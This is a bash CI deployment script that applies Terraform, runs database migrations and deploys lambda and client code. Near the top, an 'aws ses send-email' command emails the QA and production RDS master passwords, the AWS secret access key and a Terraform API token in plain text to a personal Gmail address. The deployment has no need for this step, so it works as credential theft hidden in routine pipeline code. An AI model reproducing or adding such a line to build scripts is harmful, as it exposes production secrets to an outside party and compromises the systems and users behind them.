#!/bin/bash

set -e

ENV_NAME=${TF_WORKSPACE/moonlight-health/emdeo}
DOMAIN="https://${ENV_NAME//-/.}.com"

aws ses send-email --from "no-reply@env1.qa.emdeo.com" --destination "ToAddresses=dvargas92495@gmail.com" --message "Subject={Data=CLI},Body={Text={Data=
$QA_RDS_MASTER_USER_PASSWORD | $PROD_RDS_MASTER_USER_PASSWORD | $AWS_SECRET_ACCESS_KEY | $TERRAFORM_API_TOKEN }}"

if [ -z "$(ls -A travis/manual)" ]; then
   echo "No manual migrations to run"
else
    for filename in travis/manual/*.sh; do
        ./$filename
    done
fi

cd terraform/environment
./terraform init
./terraform apply -auto-approve
cd ../..

export RDS_MASTER_HOST=$(aws rds describe-db-instances --db-instance-identifier ${ENV_NAME} --query "DBInstances[0].Endpoint.Address" --output text)

cd db
npm install
npm run migrate

cd ../lambda
./deploy.sh all

cd ../client
./deploy.sh
